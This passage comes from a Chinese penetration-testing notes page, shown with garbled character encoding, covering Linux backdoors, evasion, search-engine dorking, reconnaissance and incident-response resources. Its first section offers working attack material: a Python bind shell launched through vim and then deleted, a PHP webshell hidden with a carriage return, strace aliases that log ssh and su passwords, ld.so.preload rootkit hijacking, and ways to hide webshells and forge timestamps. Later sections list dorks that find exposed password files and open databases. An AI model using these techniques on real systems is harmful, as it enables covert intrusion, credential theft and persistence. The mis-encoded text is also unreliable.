æ­¤æ–¹æ³•é€‚ç”¨äºå®‰è£…äº†vimä¸”å®‰è£…äº†pythonæ‰©å±•(ç»å¤§ç‰ˆæœ¬é»˜è®¤å®‰è£…)çš„linuxç³»ç»Ÿ,è‡³äºæ¶æ„è„šæœ¬dir.pyçš„å†…å®¹å¯ä»¥æ˜¯ä»»ä½•åŠŸèƒ½çš„åé—¨ã€‚å¦‚pythonç‰ˆæœ¬çš„æ­£å‘åé—¨ç›‘å¬11ç«¯å£ã€‚

æ£€æµ‹æœ‰æ— æ‰©å±•
```bash
vim --version | grep python
```

enter the mal script directory ã€execute the script and then remove the script
`cd /usr/lib/python2.7/site-packages`
```python
vim dir.py
#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html
from socket import *
import subprocess
import os, threading, sys, time

if __name__ == "__main__":
        server=socket(AF_INET,SOCK_STREAM)
        server.bind(('0.0.0.0',11))
        server.listen(5)
        print 'waiting for connect'
        talk, addr = server.accept()
        print 'connect from',addr
        proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,
                stdout=talk, stderr=talk, shell=True)
```
`$(nohup vim -E -c "pyfile dir.py"> /dev/null 2>&1 &) && sleep 2 && rm -f dir.py`

read more [[DARK] Weapons of Text Destruction](https://github.com/jaredestroud/WOTD/blob/master/%5BDARK%5D%20Weapons%20of%20%20Text%20Destruction.pdf)

**ç»ˆç«¯è§£æ\rå¯¼è‡´çš„é—®é¢˜**
```bash
echo -e "<?=\`\$_POST[good]\`?>\r<?='PHP Test Page >||<                  ';?>" >/var/www/html/test.php
```

**straceè®°å½•sshç™»å½•å¯†ç **
æ³¨æ„bash_profileæ˜¯åœ¨ç™»å½•çš„shellæ‰§è¡Œçš„ï¼Œbashrcæ˜¯åœ¨éç™»å½•çš„shellæ‰§è¡Œ,å³å¦‚æœä½ åªæ˜¯æƒ³æ¯æ¬¡åœ¨ç™»å½•çš„æ—¶å€™è®©å®ƒå»æ‰§è¡Œï¼Œè¿™ä¸ªæ—¶å€™ä½ å¯ä»¥æŠŠä½ çš„å‘½ä»¤å†™åœ¨.bash_profile,å¦‚æœä½ æƒ³æ¯æ¬¡æ‰“å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯çš„æ—¶å€™éƒ½å»æ‰§è¡Œï¼Œé‚£ä¹ˆåº”è¯¥æŠŠå‘½ä»¤å†™åœ¨.bashrcä¸­ã€‚
```bash
alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 ssh'
#ä¹Ÿå¯è®°å½• suå¯†ç  
alias su='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 su'

grep "read(3" /tmp/sshpwd-åå­—è‡ªå·±è¡¥å…¨  | tail -n 11
```

**é¢„åŠ è½½å‹åŠ¨æ€é“¾æ¥åº“åé—¨ ld.so.preload**
åœ¨linuxä¸‹æ‰§è¡ŒæŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¹‹å‰ï¼Œç³»ç»Ÿä¼šé¢„å…ˆåŠ è½½ç”¨æˆ·å®šä¹‰çš„åŠ¨æ€é“¾æ¥åº“çš„ä¸€ç§æŠ€æœ¯ï¼Œè¿™ä¸ªæŠ€æœ¯å¯ä»¥é‡å†™ç³»ç»Ÿçš„åº“å‡½æ•°ï¼Œå¯¼è‡´å‘ç”ŸHijack
strace å‘½ä»¤idçš„æ—¶å€™å¯ä»¥å‘ç°æœ‰é¢„å…ˆå»è¯»å–/etc/ld.so.preloadæ–‡ä»¶(ä¹Ÿå¯ä½¿ç”¨è®¾ç½®LD_PRELAODç¯å¢ƒå˜é‡æ–¹å¼)ï¼Œå¦‚æœæˆ‘ä»¬å°†äº‹å…ˆå†™å¥½çš„æ¶æ„soæ–‡ä»¶ä½ç½®å†™å…¥ld.so.preloadæ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šè¾¾åˆ°â€œåŠ«æŒâ€çš„æ•ˆæœã€‚
æ¯”è¾ƒå¥½ç”¨çš„å·¥å…·æœ‰Vegileå’Œcub3ç­‰
[cub3](https://github.com/mempodippy/cub3),è¿™ä¸ªå·¥å…·ä½¿ç”¨äº†LD_PRELOADå’Œç³»ç»Ÿçš„æ‰©å±•å±æ€§å»éšè—æ–‡ä»¶ã€‚
å…¶ä¸­è¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡ä¿®æ”¹åŠ¨æ€é“¾æ¥å™¨æ¥åŠ è½½æ¶æ„åŠ¨æ€é“¾æ¥åº“çš„åé—¨ï¼Œé€šè¿‡æ›¿æ¢æˆ–è€…ä¿®æ”¹åŠ¨æ€é“¾æ¥å™¨ä¸­çš„é»˜è®¤é¢„åŠ è½½é…ç½®æ–‡ä»¶/etc/ld.so.preloadè·¯å¾„çš„rootkitï¼Œæ­¤æ–¹æ³•æ›´åŠ éšè”½ï¼Œè¿™ä¸ªæ–¹æ³•çš„è¾ƒæˆç†Ÿçš„åˆ©ç”¨å·¥å…·æ˜¯Vlanyï¼Œgithubåœ°å€https://github.com/mempodippy/vlany

**Vegile**
This tool will set up your backdoor/rootkits when backdoor is already setup it will be hidden your specific process,unlimited your session in metasploit and transparent. Even when it is killed, it will re-run again. There will always be a procces which will run another process, so we can assume that this procces is unstopable like a Ghost in The Shell
```bash
git clone https://github.com/Screetsec/Vegile.git
cd Vegile
chmod +x Vegile
é¸½
```

**è¿›ç¨‹æ³¨å…¥**
ä½¿ç”¨ptraceå‘è¿›ç¨‹ä¸­æ³¨å…¥æ¶æ„soæ–‡ä»¶å·¥å…·[linux-inject](https://github.com/gaffe23/linux-inject/)

**å†…æ ¸çº§rootkit**
å¦‚mafixã€[Diamorphine](https://github.com/m0nad/Diamorphine)

**Reference**
- [linuxå¸¸è§backdooråŠæ’æŸ¥æŠ€æœ¯](https://xz.aliyun.com/t/4090)
- [Linuxåé—¨æ•´ç†åˆé›†](https://www.secpulse.com/archives/59674.html)

#### éšè—è¿›ç¨‹
**è—æ–‡ä»¶å’Œæ–‡ä»¶å¤¹**
1. æ¯”å¦‚åˆ›å»ºä¸€ä¸ªåå­—å¼€å¤´å¸¦ . çš„ Webshell æˆ–è€…æ–‡ä»¶å¤¹ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥çš„ï¼Œæµè§ˆå™¨è®¿é—®çš„æ—¶å€™åŠ ç‚¹è®¿é—®å°±è¡Œã€‚ï¼ˆæŸ¥çœ‹æ–¹æ³•ï¼šls -aï¼‰
`touch .webshell.php    åˆ›å»ºåå­—ä¸º .webshell.php çš„æ–‡ä»¶`
`mkdir .backdoor/       åˆ›å»ºåå­—ä¸º .backdoor çš„æ–‡ä»¶å¤¹`

2. é™¤éåœ¨ç®¡ç†å‘˜å–å¤šäº†æˆ–è€…è„‘å­è½¬ä¸è¿‡æ¥çš„æƒ…å†µä¸‹ï¼Œæ˜¯ç»å¯¹ä¸ä¼šå‘ç°çš„ï¼è‡³å°‘æˆ‘ç”¨äº†è¿™ä¹ˆä¹…æ˜¯æ²¡å‡ ä¸ªå‘ç°çš„ã€‚å¦‚æœæ˜¯æ–‡ä»¶çš„è¯æµè§ˆå™¨è®¿é—®ç›´æ¥è¾“ ... å°±è¡Œï¼Œç›®å½•åŒç†ã€‚
`touch ...       åˆ›å»ºåå­—ä¸º ... çš„æ–‡ä»¶`
`mkdir ...       åˆ›å»ºåå­—ä¸º ... çš„æ–‡ä»¶å¤¹`

**Linux/Unix ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ³**
ç›´æ¥å°†æ—¶é—´æˆ³ä¿®æ”¹æˆæŸå¹´æŸæœˆæŸæ—¥ã€‚å¦‚ä¸‹ 2014 å¹´ 01 æœˆ 02 æ—¥ã€‚
`touch -t 1401021042.30 webshell.php`

---

## äº‹ä»¶å“åº”
### æ“ä½œç³»ç»Ÿå–è¯
**æ‰‹æœº**
é¸½

**win**
- æŠ“key
    - [AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne) - æŠ“å¯†ç ç¥å™¨
    - [Arvanaghi/SessionGopher](https://github.com/Arvanaghi/SessionGopher) - ä½¿ç”¨WMI æå–WinSCPã€PuTTYã€SuperPuTTYã€FileZillaå’ŒMicrosoft remote Desktopç­‰è¿œç¨‹è®¿é—®å·¥å…·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯çš„psè„šæœ¬

### å†…å­˜å–è¯
é¸½

### æ–‡ä»¶å–è¯
**exif**
- [ExifTool](https://www.sno.phy.queensu.ca/~phil/exiftool/)

**æµè§ˆå™¨å–è¯**
- [obsidianforensics/hindsight](https://github.com/obsidianforensics/hindsight) - å†å²è®¿é—®è®°å½•å–è¯å·¥å…·(çœŸæ˜¯ä¸ç»™äººç•™æ¡æ´»è·¯)

### åº”æ€¥å¤„ç½®
- [meirwah/awesome-incident-response](https://github.com/meirwah/awesome-incident-response)
- [NextronSystems/APTSimulator](https://github.com/NextronSystems/APTSimulator) - ä¼ªè£…æˆAPTå—å®³è€…ï¼Ÿ(è¿˜æœ‰è¿™ç§æ“ä½œ)

---

## ä¿¡æ¯æ”¶é›†
### æ¼æ´
#### webæ¼æ‰«
**[AWVS-acunetix](https://www.acunetix.com/vulnerability-scanner/)**
- æ–‡ç« 
    - [ç¼–å†™AWVSè„šæœ¬æ¢æµ‹web services](http://gv7.me/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/)

- è§£å¯†è„šæœ¬
    - [fnmsd/awvs_script_decode](https://github.com/fnmsd/awvs_script_decode)

#### ç»¼åˆæ¼æ‰«
**[Nessus](https://www.tenable.com/downloads/nessus)**
- æŠ¥å‘Šç¿»è¯‘
    - [FunnyKun/NessusReportInChinese](https://github.com/FunnyKun/NessusReportInChinese)
    - [Bypass007/Nessus_to_report](https://github.com/Bypass007/Nessus_to_report)

**[ysrc/xunfeng](https://github.com/ysrc/xunfeng)**


---

### æœç´¢å¼•æ“ Hacking
**github**
- ä¾‹å­
    ```bash
    create user  identified by
    create user zabbix@'%' identified by
    ```

**google**
- ä¾‹å­
    ```bash
    inurl:tw
    inurl:jp

    inurl:editor/db/
    inurl:eWebEditor/db/
    inurl:bbs/data/
    inurl:databackup/
    inurl:blog/data/
    inurl:\boke\data
    inurl:bbs/database/
    inurl:conn.asp
    inc/conn.asp
    Server.mapPath(".mdb")
    allinurl:bbs data
    filetype:mdb inurl:database
    filetype:inc conn
    inurl:data filetype:mdb
    intitle:"index of" data

    intitle:"index of" etc
    intitle:"Index of" .sh_history
    intitle:"Index of" .bash_history
    intitle:"index of" passwd
    intitle:"index of" people.lst
    intitle:"index of" pwd.db
    intitle:"index of" etc/shadow
    intitle:"index of" spwd
    intitle:"index of" master.passwd
    intitle:"index of" htpasswd
    inurl:service.pwd

    site:218.87.21.*
    inurl:è€è™æœº site:*.gov
    ```

**[Shodan](https://www.shodan.io)**
- è¯­æ³•
    ```bash
    hostnameï¼šæœç´¢æŒ‡å®šçš„ä¸»æœºæˆ–åŸŸå,ä¾‹å¦‚ hostname:"google"
    portï¼šæœç´¢æŒ‡å®šçš„ç«¯å£æˆ–æœåŠ¡,ä¾‹å¦‚ port:"21"
    countryï¼šæœç´¢æŒ‡å®šçš„å›½å®¶,ä¾‹å¦‚ country:"CN"
    cityï¼šæœç´¢æŒ‡å®šçš„åŸå¸‚,ä¾‹å¦‚ city:"Hefei"
    orgï¼šæœç´¢æŒ‡å®šçš„ç»„ç»‡æˆ–å…¬å¸,ä¾‹å¦‚ org:"google"
    ispï¼šæœç´¢æŒ‡å®šçš„ISPä¾›åº”å•†,ä¾‹å¦‚ isp:"China Telecom"
    productï¼šæœç´¢æŒ‡å®šçš„æ“ä½œç³»ç»Ÿ/è½¯ä»¶/å¹³å°,ä¾‹å¦‚ product:"Apache httpd"
    versionï¼šæœç´¢æŒ‡å®šçš„è½¯ä»¶ç‰ˆæœ¬,ä¾‹å¦‚ version:"1.6.2"
    geoï¼šæœç´¢æŒ‡å®šçš„åœ°ç†ä½ç½®,å‚æ•°ä¸ºç»çº¬åº¦,ä¾‹å¦‚ geo:"31.8639, 117.2808"
    before/afterï¼šæœç´¢æŒ‡å®šæ”¶å½•æ—¶é—´å‰åçš„æ•°æ®,æ ¼å¼ä¸ºdd-mm-yy,ä¾‹å¦‚ before:"11-11-15"
    netï¼šæœç´¢æŒ‡å®šçš„IPåœ°å€æˆ–å­ç½‘,ä¾‹å¦‚ net:"210.45.240.0/24"
    ```

- ä¾‹å­
    ```bash
    #å‹æƒ…æé†’,ä¸è¦çæ
    misc
    Server: uc-httpd 1.0.0 200 OK Country:"JP"
    h3c net:"61.191.146.0/24"
    country:US vuln:CVE-2014-0160
    port:135,139,445 -hash:0   # è¿‡æ»¤ä¸€äº›ä¸»æ–‡æœ¬æ ‡é¢˜ä¸ºç©ºçš„æœç´¢ç»“æœ
    Hikvision-Webs      # æµ·åº·å¨è§†

    database
    all:"mongodb server information" all:"metrics"  # å¼€æ”¾Mongodbæ•°æ®åº“
    port:27017 -all:"partially" all:"fs.files"      # æœ‰ç‚¹å­˜è´§çš„Mongodbæ•°æ®åº“
    port:"9200" all:"elastic indices"   # å¼€æ”¾ElasticSearchæ•°æ®åº“

    ftp
    230 'anonymous@' login ok      # å¼€æ”¾åŒ¿åftp

    vnc
    port:5900 screenshot.label:loggedin  # æ— è®¤è¯vnc
    ```

- å¤–éƒ¨å·¥å…·
    ```bash
    Shodan cli
    https://cli.shodan.io/

    æµè§ˆå™¨æ’ä»¶
    https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap
    https://addons.mozilla.org/en-US/firefox/addon/shodan_io/

    Metasploit
    use auxiliary/gather/shodan_search
    set SHODAN_APIKEY ********************
    set QUERY ****

    use auxiliary/gather/shodan_honeyscore  # èœœç½æ£€æµ‹
    set SHODAN_APIKEY ********************
    set TARGET your_target

    Recon-ng
    keys add shodan_api ********************
    use recon/domains-hosts/shodan_hostname
    show options
    set SOURCE google
    set LIMIT 1
    ```

**[censys](https://www.censys.io)**
- ä¾‹å­
    ```bash
    23.0.0.0/8 or 8.8.8.0/24ã€€ã€€å¯ä»¥ä½¿ç”¨and or not
    80.http.get.status_code: 200ã€€ã€€æŒ‡å®šçŠ¶æ€
    80.http.get.status_code:[200 TO 300]ã€€ã€€200-300ä¹‹é—´çš„çŠ¶æ€ç 
    location.country_code: DEã€€ã€€å›½å®¶
    protocols: ("23/telnet" or "21/ftp")ã€€ã€€åè®®
    tags: scadaã€€ã€€æ ‡ç­¾
    80.http.get.headers.serverï¼šnginxã€€ã€€æœåŠ¡å™¨ç±»å‹ç‰ˆæœ¬
    autonomous_system.description: Universityã€€ã€€ç³»ç»Ÿæè¿°
    ```

**[é’Ÿé¦—ä¹‹çœ¼](https://www.zoomeye.org/)**
- è¯­æ³•
    ```bash
    app:nginxã€€ã€€ç»„ä»¶å
    ver:1.0ã€€ã€€ç‰ˆæœ¬
    os:windowsã€€ã€€æ“ä½œç³»ç»Ÿ
    country:"China"ã€€ã€€å›½å®¶
    city:"hangzhou"ã€€ã€€åŸå¸‚
    port:80ã€€ã€€ç«¯å£
    hostname:googleã€€ã€€ä¸»æœºå
    site:google.comã€€ã€€ç½‘ç«™åŸŸå
    desc:nmaskã€€ã€€æè¿°
    keywords:passwdã€€ã€€å…³é”®è¯
    service:ftpã€€ã€€æœåŠ¡ç±»å‹
    ip:8.8.8.8ã€€ã€€ipåœ°å€
    cidr:8.8.8.8/24ã€€ã€€ipåœ°å€æ®µ
    ```

- ä¾‹å­
    ```bash
    city:tokyo + app:weblogic   # weblogicååºåˆ—åŒ–æ¥ä¸€æ³¢ï¼Ÿ
    ```

**[FoFa](https://fofa.so)**
- è¯­æ³•
    ```bash
    title="abc" ä»æ ‡é¢˜ä¸­æœç´¢abcã€‚ä¾‹ï¼šæ ‡é¢˜ä¸­æœ‰åŒ—äº¬çš„ç½‘ç«™ã€‚
    header="abc" ä»httpå¤´ä¸­æœç´¢abcã€‚ä¾‹ï¼šjbossæœåŠ¡å™¨ã€‚
    body="abc" ä»htmlæ­£æ–‡ä¸­æœç´¢abcã€‚ä¾‹ï¼šæ­£æ–‡åŒ…å«Hacked byã€‚
    domain="qq.com" æœç´¢æ ¹åŸŸåå¸¦æœ‰qq.comçš„ç½‘ç«™ã€‚ä¾‹ï¼š æ ¹åŸŸåæ˜¯qq.comçš„ç½‘ç«™ã€‚
    host=".gov.cn" ä»urlä¸­æœç´¢.gov.cn,æ³¨æ„æœç´¢è¦ç”¨hostä½œä¸ºåç§°ã€‚
    port="443" æŸ¥æ‰¾å¯¹åº”443ç«¯å£çš„èµ„äº§ã€‚ä¾‹ï¼š æŸ¥æ‰¾å¯¹åº”443ç«¯å£çš„èµ„äº§ã€‚
    ip="1.1.1.1" ä»ipä¸­æœç´¢åŒ…å«1.1.1.1çš„ç½‘ç«™,æ³¨æ„æœç´¢è¦ç”¨ipä½œä¸ºåç§°ã€‚
    protocol="https" æœç´¢åˆ¶å®šåè®®ç±»å‹(åœ¨å¼€å¯ç«¯å£æ‰«æçš„æƒ…å†µä¸‹æœ‰æ•ˆ)ã€‚ä¾‹ï¼š æŸ¥è¯¢httpsåè®®èµ„äº§ã€‚
    city="Beijing" æœç´¢æŒ‡å®šåŸå¸‚çš„èµ„äº§ã€‚ä¾‹ï¼š æœç´¢æŒ‡å®šåŸå¸‚çš„èµ„äº§ã€‚
    region="Zhejiang" æœç´¢æŒ‡å®šè¡Œæ”¿åŒºçš„èµ„äº§ã€‚ä¾‹ï¼š æœç´¢æŒ‡å®šè¡Œæ”¿åŒºçš„èµ„äº§ã€‚
    country="CN" æœç´¢æŒ‡å®šå›½å®¶(ç¼–ç )çš„èµ„äº§ã€‚ä¾‹ï¼š æœç´¢æŒ‡å®šå›½å®¶(ç¼–ç )çš„èµ„äº§ã€‚
    cert="google.com" æœç´¢è¯ä¹¦(httpsæˆ–è€…imapsç­‰)ä¸­å¸¦æœ‰google.comçš„èµ„äº§ã€‚
    ```

- ä¾‹å­
    ```bash
    title="powered by" && title!=discuz
    title!="powered by" && body=discuz
    (body="content=\"WordPress" || (header="X-Pingback" && header="/xmlrpc.php" && body="/wp-includes/") ) && host="gov.cn"
    ```

**[Dnsdb](https://www.dnsdb.io/)**
- è¯­æ³•
    ```bash
    DnsDBæŸ¥è¯¢è¯­æ³•ç»“æ„ä¸ºæ¡ä»¶1 æ¡ä»¶2 æ¡ä»¶3 â€¦., æ¯ä¸ªæ¡ä»¶ä»¥ç©ºæ ¼é—´éš”, DnsDB ä¼šæŠŠæ»¡è¶³æ‰€æœ‰æŸ¥è¯¢æ¡ä»¶çš„ç»“æœè¿”å›ç»™ç”¨æˆ·.

    åŸŸåæŸ¥è¯¢æ¡ä»¶
    æŸ¥è¯¢è¯­æ³•ä¸º`domain:.`
    åŸŸåæŸ¥è¯¢æ˜¯æŒ‡æŸ¥è¯¢é¡¶çº§ç§æœ‰åŸŸåæ‰€æœ‰çš„DNSè®°å½•,
    ä¾‹å¦‚æŸ¥è¯¢google.com çš„æ‰€æœ‰DNSè®°å½•: `domain:google.com.`
    åŸŸåæŸ¥è¯¢å¯ä»¥çœç•¥domain:.

    ä¸»æœºæŸ¥è¯¢æ¡ä»¶
    æŸ¥è¯¢è¯­æ³•:`host:`
    ä¾‹å¦‚æŸ¥è¯¢ä¸»æœºåœ°å€ä¸ºmp3.example.comçš„DNSè®°å½•:`host:map3.example.com`
    ä¸»æœºæŸ¥è¯¢æ¡ä»¶ä¸åŸŸåæŸ¥è¯¢æŸ¥è¯¢æ¡ä»¶çš„åŒºåˆ«åœ¨äº, ä¸»æœºæŸ¥è¯¢åŒ¹é…çš„æ˜¯DNSè®°å½•çš„Hostå€¼

    æŒ‰DNSè®°å½•ç±»å‹æŸ¥è¯¢
    æŸ¥è¯¢è¯­æ³•: `type:.`
    ä¾‹å¦‚åªæŸ¥è¯¢Aè®°å½•: `type:a`
    ä½¿ç”¨æ¡ä»¶:å¿…é¡»å­˜åœ¨domain:æˆ–è€…host:æ¡ä»¶,æ‰å¯ä»¥ä½¿ç”¨type:æŸ¥è¯¢è¯­æ³•

    æŒ‰IPé™åˆ¶
    æŸ¥è¯¢è¯­æ³•: `ip:`
    æŸ¥è¯¢æŒ‡å®šIP: `ip:8.8.8.8` è¯¥æŸ¥è¯¢ä¸ç›´æ¥è¾“å…¥8.8.8.8è¿›è¡ŒæŸ¥è¯¢ç­‰æ•ˆ
    æŸ¥è¯¢æŒ‡å®šIPèŒƒå›´: `ip:8.8.8.8-8.8.255.255`
    CIDR: `ip:8.8.0.0/24`
    IPæœ€å¤§èŒƒå›´é™åˆ¶65536ä¸ª
    ```

- ä¾‹å­
    æŸ¥è¯¢google.comçš„æ‰€æœ‰Aè®°å½•: `google.com type:a`

**Reference**
- [ã€æ¸—é€ç¥å™¨ç³»åˆ—ã€‘æœç´¢å¼•æ“](https://thief.one/2017/05/19/1/)
- [Shodanæ–°æ‰‹å…¥å‘æŒ‡å—](https://www.freebuf.com/sectool/121339.html)
- [shodan-manual](https://b404.gitbooks.io/shodan-manual/)
- [How to Discover MongoDB and Elasticsearch Open Databases](https://habr.com/en/post/443132/)

---

### ç½‘ç»œ
**TTLæ¥åˆ¤æ–­ç›®çš„ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹**
ä¸‹é¢æ˜¯é»˜è®¤æ“ä½œç³»ç»Ÿçš„TTLï¼š
```bash
1ã€WINDOWS NT/2000   TTLï¼š128
2ã€WINDOWS 95/98     TTLï¼š32
3ã€UNIX              TTLï¼š255
4ã€LINUX             TTLï¼š64
5ã€WIN7              TTLï¼š64
```

**ä¿®æ”¹æœ¬æœºç”µè„‘ä¸Šé¢çš„é»˜è®¤TTLå€¼**
é€šè¿‡ä¿®æ”¹æœ¬æœºä¸Šçš„TTLå€¼å¯ä»¥æ··æ·†æ”»å‡»è€…çš„åˆ¤æ–­ï¼ˆå½“ç„¶,å¾ˆå°‘æœ‰ç”¨æˆ·ä¼šè¿™ä¹ˆåšï¼‰ã€‚TTL å€¼åœ¨æ³¨å†Œè¡¨çš„ä½ç½®æ˜¯ï¼š`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters `å…¶ä¸­æœ‰ä¸ª DefaultTTL çš„ DWORD å€¼,å…¶æ•°æ®å°±æ˜¯é»˜è®¤çš„ TTL å€¼äº†,æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ DefaultTTL é‡Œé¢çš„ TTL é»˜è®¤å€¼,ä½†ä¸èƒ½å¤§äºåè¿›åˆ¶çš„ 255ã€‚

#### IPæ‰«
**å·¥å…·**
- netdiscover
    `netdiscover -r 1.1.1.0/24`

---

### ç½‘ç«™
#### DNSæšä¸¾
**å·¥å…·**
- [lijiejie/subDomainsBrute](https://github.com/lijiejie/subDomainsBrute)
- [bit4woo/teemo](https://github.com/bit4woo/Teemo)
- [ring04h/wydomain](https://github.com/ring04h/wydomain)
- [bitquark/dnspop](https://github.com/bitquark/dnspop)
- [fwaeytens/dnsenum](https://github.com/fwaeytens/dnsenum)
- [mschwager/fierce](https://github.com/mschwager/fierce)

#### ç›®å½•æšä¸¾
**å­—å…¸**
- [DictionaryHouse/Dirpath_List](https://github.com/DictionaryHouse/Dirpath_List)

**å·¥å…·**
- [Xyntax/DirBrute](https://github.com/Xyntax/DirBrute)
- [Nekmo/dirhunt](https://github.com/Nekmo/dirhunt)
- [maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)

**æ–‡ç« **
- [ç†Ÿç»ƒä½¿ç”¨å„ç±»æ•æ„Ÿç›®å½•æ–‡ä»¶æ‰«æå·¥å…·](https://klionsec.github.io/2014/12/16/dirscan-tools/)
- [DIRB | Penetration Testing Tools](https://tools.kali.org/web-applications/dirb)

#### æŒ‡çº¹
**å·¥å…·**
- [michenriksen/aquatone](https://github.com/michenriksen/aquatone)
- [urbanadventurer/WhatWeb](https://github.com/urbanadventurer/WhatWeb)
- [tanjiti/FingerPrint](https://github.com/tanjiti/FingerPrint)

**æ–‡ç« **
- [WAFæŒ‡çº¹æ¢æµ‹åŠè¯†åˆ«æŠ€æœ¯](https://www.freebuf.com/articles/web/21744.html)
- [é˜»ç¢è·å–çœŸå®ç½‘ç»œæŒ‡çº¹](http://b404.xyz/2018/01/27/hidden-the-network/)

#### CDN/æŸ¥æºIP
**Nslookupæ³•**
`nslookup + åŸŸå`

**å¤šåœ°pingåŸŸåæ³•**
åˆ©ç”¨åœ¨çº¿ç½‘ç«™æœåŠ¡å¤šåœ° ping æµ‹è¯•

**"å¸¸è¯†"åˆ¤æ–­æ³•**
åœ¨åæŸ¥ç½‘ç«™ ip æ—¶,å¦‚æœæ­¤ç½‘ç«™æœ‰ 1000 å¤šä¸ªä¸åŒåŸŸå,é‚£ä¹ˆè¿™ä¸ª ip å¤šåŠä¸æ˜¯çœŸå® ipã€‚
å¦‚æœä¸€ä¸ª asp æˆ–è€… asp.net ç½‘ç«™è¿”å›çš„å¤´å­—æ®µçš„ server ä¸æ˜¯ IISã€è€Œæ˜¯ Nginx,é‚£ä¹ˆå¤šåŠæ˜¯ç”¨äº† nginx åå‘ä»£ç†,è€Œä¸æ˜¯çœŸå® ipã€‚
å¦‚æœ ip å®šä½æ˜¯åœ¨å¸¸è§ cdn æœåŠ¡å•†çš„æœåŠ¡å™¨ä¸Š,é‚£ä¹ˆæ˜¯çœŸå® ip çš„å¯èƒ½æ€§å°±å¾®ä¹å…¶å¾®äº†ã€‚

**å­åŸŸåæŸ¥æ‰¾æ³•**
åˆ©ç”¨ä¸€äº›åœ¨çº¿æŸ¥è¯¢çš„ç½‘ç«™
https://x.threatbook.cn/
https://dnsdb.io/zh-cn/ åªéœ€è¾“å…¥ baidu.com type:A å°±èƒ½æ”¶é›†ç™¾åº¦çš„å­åŸŸåå’Œ ip
Google æœç´¢ Google site:baidu.com -www å°±èƒ½æŸ¥çœ‹é™¤ www å¤–çš„å­åŸŸå

**ä½¿ç”¨å­åŸŸåæ‰«æå™¨**
ä¾‹å¦‚å­åŸŸåæŒ–æ˜æœºå’Œ subdomainbrute(https://github.com/lijiejie/subDomainsBrute)

æ€»ç»“ï¼šæ”¶é›†å­åŸŸååå°è¯•ä»¥è§£æ ip ä¸åœ¨ CDN ä¸Šçš„ ip è§£æä¸»ç«™,çœŸå® ip æˆåŠŸè¢«è·å–åˆ°ã€‚

---

### ä¸»æœº
#### ç«¯å£æ‰«
**ç«¯å£ä¿¡æ¯**
- [Service Name and Transport Protocol Port Number Registry](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)
- ç«¯å£åˆ—è¡¨æ–‡ä»¶[md](./æ–‡ä»¶/ç«¯å£åˆ—è¡¨.md)ã€[xlsx](./æ–‡ä»¶/ç«¯å£åˆ—è¡¨.xlsx)
- å¸¸è§ç«¯å£æ¸—é€[png](./æ–‡ä»¶/å¸¸è§ç«¯å£æ¸—é€.png)

**[nmap](https://nmap.org/download.html)**
- **ç”¨æ³•**
    `nmap -T5 -A -v 1.1.1.1`

- **è„šæœ¬**



- **æŠ¥å‘Šæ¨¡æ¿**
    [honze-net/nmap-bootstrap-xsl](https://github.com/honze-net/nmap-bootstrap-xsl)

- **æ–‡ç« **
- [ã€æ¸—é€ç¥å™¨ç³»åˆ—ã€‘nmap](https://thief.one/2017/05/02/1/)
- [Nmapæ‰«æåŸç†ä¸ç”¨æ³•](https://blog.csdn.net/aspirationflow/article/details/7694274)

**[masscan](https://github.com/robertdavidgraham/masscan)**

#### åŸŸä¿¡æ¯
- windows
    ```bash
    systeminfo
    ```

- åŸŸç”¨æˆ·åˆ—è¡¨
    a.åˆ†æç‰¹æƒç”¨æˆ·ç»„
    b.å®šä½æŒ‡å®šç”¨æˆ·

- ADä¿¡æ¯æ”¶é›†
    a.GPO
    b.ç‰¹æƒä»¤ç‰Œ
    c.ä¿¡ä»»å…³ç³»
    d.å®šä½æŒ‡å®šæœºå™¨

---

## è¿ç»´ä¿éšœ
### åŸºçº¿
**èµ„æº**
- [CIS Benchmarks](https://learn.cisecurity.org/benchmarks)
    å®‰å…¨é…ç½®å»ºè®®ï¼Œå†…å®¹å¾ˆå¤šï¼Œè™½ç„¶æ˜¯è‹±æ–‡ç‰ˆæœ¬

**å·¥å…·**
- [lis912/CapOS](https://github.com/lis912/CapOS)
    ç­‰çº§ä¿æŠ¤æµ‹è¯„windowsåŸºçº¿æ£€æŸ¥

**æ–‡ç« **
- [ç»éªŒåˆ†äº« | ä¼ä¸šå¦‚ä½•åšå¥½å®‰å…¨åŸºçº¿é…ç½®](https://www.freebuf.com/articles/es/158781.html)

---

### åº”ç”¨å®‰å…¨
**æŸ¥æš—é“¾**
1. æœç´¢å¼•æ“:`é»‘äº§å…³é”®å­—+site:"ç½‘ç«™åŸŸå"`
2. ç”¨ç±»ä¼¼xenu(å°½é‡åœ¨è™šæ‹Ÿæœºä¸‹è¿è¡Œ)çš„å·¥å…·æ‰¹é‡çˆ¬å–ç½‘ç«™å¤–é“¾æŸ¥çœ‹æœ‰æ— å…³é”®å­—

**æŸ¥åé—¨**
1. [Dç›¾](http://www.d99net.net/)
2. [æ·±ä¿¡æœWebåé—¨æ‰«æ](http://edr.sangfor.com.cn/backdoor_detection.html)
3. [æ²³é©¬webshellæŸ¥æ€](http://www.shellpub.com/)
4. [é“±è¿…Webshellæ‰«æå™¨](http://www.yxlink.com/technology.php)
5. [ç½‘ç«™å®‰å…¨ç‹—ç½‘é©¬æŸ¥æ€](download.safedog.cn/download/software/safedogwzApache.exe)
